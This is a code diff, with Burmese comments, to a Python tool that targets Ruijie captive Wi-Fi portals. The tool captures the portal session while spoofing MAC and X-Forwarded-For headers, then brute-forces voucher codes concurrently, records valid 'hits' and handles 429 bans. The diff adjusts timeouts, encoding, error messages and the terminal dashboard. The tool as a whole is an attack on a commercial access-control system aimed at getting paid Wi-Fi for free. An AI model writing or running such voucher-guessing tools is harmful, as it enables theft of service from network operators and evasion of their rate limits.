@@ -27,7 +27,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
 CONCURRENCY_LIMIT = 8         # >10 → Ruijie 429
-TIMEOUT = 5
+TIMEOUT = 10                  # Timeout ကို ၁၀ စက္ကန့်ထိ တင်ထားတယ်
 SESSION_TTL = 280             # Ruijie sign expire ~300s
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
@@ -95,7 +95,6 @@ def detect_and_capture():
     s = requests.Session()
     s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"})
     
-    # 1. Probe URLs
     probes = [
         "http://connectivitycheck.gstatic.com/generate_204",
         "http://detectportal.firefox.com/success.txt",
@@ -109,7 +108,6 @@ def detect_and_capture():
                 return r.url
         except Exception: continue
 
-    # 2. Gateway IPs
     gateways = [get_gateway_ip(), "192.168.110.1", "10.44.77.254", "192.168.7.1", "192.168.1.1"]
     for gw in dict.fromkeys(gateways):
         try:
@@ -119,7 +117,6 @@ def detect_and_capture():
                 return r.url
         except Exception: pass
 
-    # 3. Direct Base URLs (Fallback)
     for base in [RUIJIE_MM_BASE, RUIJIE_BASE]:
         try:
             r = s.get(base, timeout=6, verify=False, allow_redirects=True)
@@ -149,7 +146,6 @@ def build_gw_params(portal_url):
     
     if q.get("gw_mac"): p["gw_mac"] = q["gw_mac"][0]
     
-    # Auto-select portal server based on captured URL
     if "portal-mm" in portal_url:
         p["url"] = RUIJIE_MM_BASE
     else:
@@ -161,20 +157,28 @@ def build_gw_params(portal_url):
 async def fetch_real_session(session, gw_params, mac, ip):
     base = gw_params.get("url", RUIJIE_BASE) + RUIJIE_WIFIDOG
     p = dict(gw_params); p["mac"] = mac; p["ip"] = ip
-    qs = "&".join(f"{k}={quote(str(v))}" for k,v in p.items())
+    
+    # URL Encode လုပ်တဲ့အခါ ပိုပြီးသေချာအောင်
+    qs = "&".join(f"{k}={quote(str(v), safe='')}" for k,v in p.items())
     url = f"{base}?{qs}"
+    
     headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
-        "Client-Mac": mac, "X-Forwarded-For": ip, "Accept": "*/*",
+        "Client-Mac": mac, 
+        "X-Forwarded-For": ip, 
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     }
     try:
-        async with session.get(url, headers=headers, timeout=8, allow_redirects=False) as r:
+        # Timeout ကို 15 စက္ကန့်ထိ တင်ထားမယ်
+        async with session.get(url, headers=headers, timeout=15, allow_redirects=False) as r:
             if r.status == 429: return ("BAN", "429")
+            
             loc = r.headers.get("Location","")
             if not loc:
                 body = await r.text()
                 m = re.search(r'(https?://[^\s"\'<>]+sessionId=[^\s"\'<>]+)', body)
                 if m: loc = m.group(1)
+                
             if loc:
                 ll = loc.lower()
                 if any(x in ll for x in ("request limited","error.html","errormsg","banned")):
@@ -189,10 +193,14 @@ async def fetch_real_session(session, gw_params, mac, ip):
                         "logonUrl":  (q2.get("logonUrl",[None])[0] or ""),
                         "acquired":  time.time(),
                     })
-                return ("NO_SESS", "no sid")
-            return ("NO_SESS", f"HTTP {r.status}")
-    except asyncio.TimeoutError: return ("NET", "timeout")
-    except Exception as e:   return ("NET", type(e).__name__)
+                return ("NO_SESS", "Redirect ပါလာပေမယ့် sid မပါဘူး")
+            
+            # Status 200 တိုက်ရိုက်ပြန်လာရင် (Portal Page ပြနေတာ)
+            return ("NO_SESS", f"HTTP {r.status} - Portal ကို Browser နဲ့ အရင် Login ဝင်ထားပါ")
+    except asyncio.TimeoutError: 
+        return ("NET", "အင်တာနက် မရပါ (Timeout)")
+    except Exception as e:   
+        return ("NET", f"Error: {type(e).__name__}")
 
 # ---------- test voucher ----------
 async def test_code(session, sess, code, mac, ip):
@@ -269,7 +277,8 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     progress = min(100.0, (tested/total)*100) if total else 0.0
     header = Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan", justify="center")
 
-    stat_style = "bold red" if any(x in status.upper() for x in ("ERR","TIMEOUT","BAN","EXHAUST", "FAIL")) else "bold green"
+    # Error တက်ရင် အနီရောင်ပြ
+    stat_style = "bold red" if any(x in status.upper() for x in ("ERR","TIMEOUT","BAN","EXHAUST", "FAIL", "CHECK")) else "bold green"
     sess_style = {"REAL":"bold green","EXPIRED":"bold red","BANNED":"bold red","HIT":"bold bright_green"}.get(sess_stat,"bold cyan")
     sess_txt = f"{sess_stat} ({(sess_id or '')[:8]})" if sess_id and sess_id != "--------" else sess_stat
 
@@ -282,8 +291,8 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     tbl.add_row("  🖥 MAC",      f": ...{mac[-8:]}",            "  🌐 IP",       f": ...{ip[-3:]}")
     tbl.add_row("  🔐 Session", f": {sess_txt}",               "  📈 Progress", f": {progress:.2f}%", style=sess_style)
 
-    # Screen နဲ့ ကိုက်ညီအောင် height ကို နည်းနည်းချထားတယ်
-    tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=8)
+    # Screen နဲ့ ကိုက်ညီအောင် height ကို အနည်းဆုံးဖြစ်အောင် ချထားတယ်
+    tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=7)
     code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}", style="bold yellow")),
                        border_style="yellow", box=ROUNDED, height=3)
 
@@ -292,7 +301,8 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     vt.add_column("Real Plan (သက်တမ်း)", style="bold green", justify="center")
     vt.add_column("Time", style="bold cyan", justify="center")
 
-    for h in list(hits)[-15:]:
+    # Hits ကို ၈ ခုပဲ ပြမယ် (Screen ကျဉ်းလို့)
+    for h in list(hits)[-8:]:
         vt.add_row(h.get('code',''), h.get('plan','N/A'), h.get('time',''))
     if not hits: vt.add_row("—","—","—")
 
@@ -301,7 +311,7 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
 
     body = Layout()
     body.split_column(
-        Layout(tbl_panel, size=8),
+        Layout(tbl_panel, size=7),
         Layout(code_panel, size=3),
         Layout(vt, ratio=1),
         Layout(footer, size=3),
@@ -373,11 +383,11 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         continue
                     else:
                         sess_stat = "FAIL"; sess = None
-                        status = f"Fail: {payload}" # Error ကို ဒီမှာ ပြမယ်
+                        status = f"Fail: {payload}" 
                         fail_count += 1
-                        if fail_count >= 5:
-                            status = "Check Wi-Fi! Not Connected."
-                            await asyncio.sleep(10)
+                        if fail_count >= 3:
+                            status = "Wi-Fi ကို Browser နဲ့ အရင်ဝင်ပါ"
+                            await asyncio.sleep(5)
                             fail_count = 0
                         else:
                             await asyncio.sleep(2)
